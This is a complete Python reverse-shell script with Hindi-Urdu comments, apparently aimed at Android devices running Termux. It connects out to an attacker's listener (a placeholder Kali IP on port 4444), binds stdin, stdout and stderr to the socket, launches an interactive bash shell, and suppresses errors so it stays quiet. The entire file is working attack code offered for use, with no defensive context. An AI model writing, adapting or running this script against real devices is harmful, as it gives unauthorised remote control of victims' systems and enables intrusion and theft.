import socket
import os
import subprocess
import sys

# ================= SETTINGS =================
HOST = "Your kali Linux IP"      # ← Kali / listener ka IP
PORT = 4444                 # ← listener ka port
# =============================================

def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        
        # Shell ko socket se jod do (stdin, stdout, stderr sab socket pe)
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Interactive shell shuru karo
        # Termux mein /data/data/com.termux/files/usr/bin/bash ya sh zyada reliable hai
        subprocess.call(["/data/data/com.termux/files/usr/bin/bash", "-i"])
        # Agar upar wala nahi chalta to yeh try karo:
        # subprocess.call(["/bin/sh", "-i"])
        
    except Exception as e:
        # Error ko chhupa do taake busybox jaisa silent rahe (optional)
        # print(f"[-] {e}", file=sys.stderr)   # agar debug chahiye to uncomment kar dena
        sys.exit(1)
    finally:
        try:
            s.close()
        except:
            pass

if __name__ == "__main__":
    main()
